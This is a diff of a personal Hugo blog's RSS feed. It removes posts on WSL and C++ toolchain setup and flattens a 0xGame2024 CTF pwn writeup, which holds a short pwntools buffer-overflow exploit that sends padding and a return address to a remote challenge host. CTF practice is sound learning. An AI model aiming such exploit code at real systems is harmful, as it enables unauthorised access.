@@ -4,98 +4,17 @@
     <title>ycna07`s Blog</title>
     <link>https://ycna07.github.io/en/</link>
     <description>Recent content on ycna07`s Blog</description>
-    <generator>Hugo -- 0.134.3</generator>
+    <generator>Hugo -- 0.120.3</generator>
     <language>en-US</language>
     <copyright>ycna07</copyright>
-    <lastBuildDate>Wed, 08 Jan 2025 05:24:02 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 14 Jan 2025 11:48:38 +0000</lastBuildDate>
     <atom:link href="https://ycna07.github.io/en/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>WSL遇到的全部问题</title>
-      <link>https://ycna07.github.io/en/posts/blog/wsl%E9%81%87%E5%88%B0%E7%9A%84%E5%85%A8%E9%83%A8%E9%97%AE%E9%A2%98/</link>
-      <pubDate>Tue, 07 Jan 2025 22:30:31 +0800</pubDate>
-      <guid>https://ycna07.github.io/en/posts/blog/wsl%E9%81%87%E5%88%B0%E7%9A%84%E5%85%A8%E9%83%A8%E9%97%AE%E9%A2%98/</guid>
-      <description>&lt;h1 id=&#34;安装archwsl&#34;&gt;安装ArchWSL&lt;/h1&gt;
-&lt;p&gt;直接从微软商店安装即可，没有使用&lt;a href=&#34;https://github.com/yuk7/ArchWSL&#34;&gt;ArchWSL项目&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;或者&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-pwsh&#34; data-lang=&#34;pwsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wsl -d Arch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;开启systemd服务&#34;&gt;开启systemd服务&lt;/h1&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim /etc/wsl.conf
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写入&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;boot&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
-&lt;li&gt;全局开启镜像网络模式&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;目前微软官方更加推荐使用 &lt;a href=&#34;https://learn.microsoft.com/zh-cn/windows/wsl/networking#mirrored-mode-networking&#34;&gt;镜像网络模式&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;打开pwsh&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-pwsh&#34; data-lang=&#34;pwsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd ~
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;code .wslconfig
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写入&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[wsl2]
-networkingMode = mirrored
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;特定wsl使用镜像模式&#34;&gt;特定WSL使用镜像模式&lt;/h2&gt;
-&lt;p&gt;目前似乎不行&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>Hugo博客搭建回顾</title>
-      <link>https://ycna07.github.io/en/posts/blog/hugo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%9B%9E%E9%A1%BE/</link>
-      <pubDate>Tue, 07 Jan 2025 21:14:41 +0800</pubDate>
-      <guid>https://ycna07.github.io/en/posts/blog/hugo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%9B%9E%E9%A1%BE/</guid>
-      <description>&lt;p&gt;参考https://krislinzhao.github.io/docs/create-a-wesite-using-github-pages-and-hugo/#6-%E7%94%A8-hugo-%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>Vscode Xmake调试跳断点分析</title>
-      <link>https://ycna07.github.io/en/posts/blog/vscode-xmake%E8%B0%83%E8%AF%95%E8%B7%B3%E6%96%AD%E7%82%B9%E5%88%86%E6%9E%90/</link>
-      <pubDate>Fri, 08 Nov 2024 12:18:31 +0800</pubDate>
-      <guid>https://ycna07.github.io/en/posts/blog/vscode-xmake%E8%B0%83%E8%AF%95%E8%B7%B3%E6%96%AD%E7%82%B9%E5%88%86%E6%9E%90/</guid>
-      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
-&lt;p&gt;&lt;code&gt;Windows版本&lt;/code&gt; ：10.0.27729&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;xmake版本&lt;/code&gt;: 2.9.5&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;xmake-vscode&lt;/code&gt;: 2.3.8&lt;/p&gt;
-&lt;p&gt;xmake-vscode设置tooltrain为mingw，platform为Windows无法调试，设置为mingw即可&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>2024年11月Vscode&#43;xmake&#43;clangd&#43;mingw&#43;cpptools配置windowsC&#43;&#43;环境</title>
-      <link>https://ycna07.github.io/en/posts/blog/vscode&#43;xmake&#43;clangd&#43;mingw&#43;cpptools%E9%85%8D%E7%BD%AEwindowsc&#43;&#43;%E7%8E%AF%E5%A2%83/</link>
-      <pubDate>Fri, 08 Nov 2024 08:51:37 +0800</pubDate>
-      <guid>https://ycna07.github.io/en/posts/blog/vscode&#43;xmake&#43;clangd&#43;mingw&#43;cpptools%E9%85%8D%E7%BD%AEwindowsc&#43;&#43;%E7%8E%AF%E5%A2%83/</guid>
-      <description>&lt;p&gt;vscode：编辑器
-xmake：基于 Lua 的轻量级跨平台构建工具
-clangd：高性能，智能代码提示与补全
-mingw：配置简单，生成的可执行文件体积小
-cpptools：用于debug（可以使用codelldb代替）&lt;/p&gt;</description>
-    </item>
     <item>
       <title>0xGame2024 Pwn&amp;Rev</title>
       <link>https://ycna07.github.io/en/posts/writeups/0xgame2024/</link>
       <pubDate>Tue, 15 Oct 2024 21:18:15 +0800</pubDate>
       <guid>https://ycna07.github.io/en/posts/writeups/0xgame2024/</guid>
-      <description>&lt;h1 id=&#34;pwn&#34;&gt;PWN&lt;/h1&gt;
-&lt;h2 id=&#34;week1&#34;&gt;Week1&lt;/h2&gt;
-&lt;h3 id=&#34;1testyourpwntool&#34;&gt;1.testyourpwntool&lt;/h3&gt;
-&lt;h3 id=&#34;2stackoverflow&#34;&gt;2.stackoverflow&lt;/h3&gt;
-&lt;p&gt;00007ffdad8c5320
-00007ffdad8c5358
-38
-backdoor：4012bd&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Python&#34; data-lang=&#34;Python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;47.97.58.52&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40001&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; payload&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000004012BD&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(payload)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000004012BD&lt;/span&gt;))
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241006202956597.png&#34; alt=&#34;addr of system&#34;  /&gt;
-&lt;/p&gt;
-&lt;h3 id=&#34;5whereismybinsh&#34;&gt;5.whereismybinsh&lt;/h3&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241008115415709.png&#34; alt=&#34;gadget&#34;  /&gt;
-&lt;/p&gt;
-&lt;p&gt;pop_rdi_ret:0x0000000000401323&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241008120813482.png&#34; alt=&#34;code&amp;amp;flag&#34;  /&gt;
-&lt;/p&gt;
-&lt;p&gt;4.find_me&lt;/p&gt;
-&lt;p&gt;尝试ioexp
-查看libc.so.6版本&lt;/p&gt;</description>
+      <description>PWN Week1 1.testyourpwntool 2.stackoverflow 00007ffdad8c5320 00007ffdad8c5358 38 backdoor：4012bd from pwn import * io = remote(&amp;#39;47.97.58.52&amp;#39;, 40001) payload=b&amp;#39;a&amp;#39;*0x38+p64(0x00000000004012BD) io.send(payload) io.send(b&amp;#39;a&amp;#39;*0x38+p64(0x00000000004012BD)) io.send(&amp;#39;\n&amp;#39;) io.interactive() 5.whereismybinsh pop_rdi_ret:0x0000000000401323 4.find_me 尝试ioexp 查看libc.so.6版本</description>
     </item>
     <item>
       <title></title>
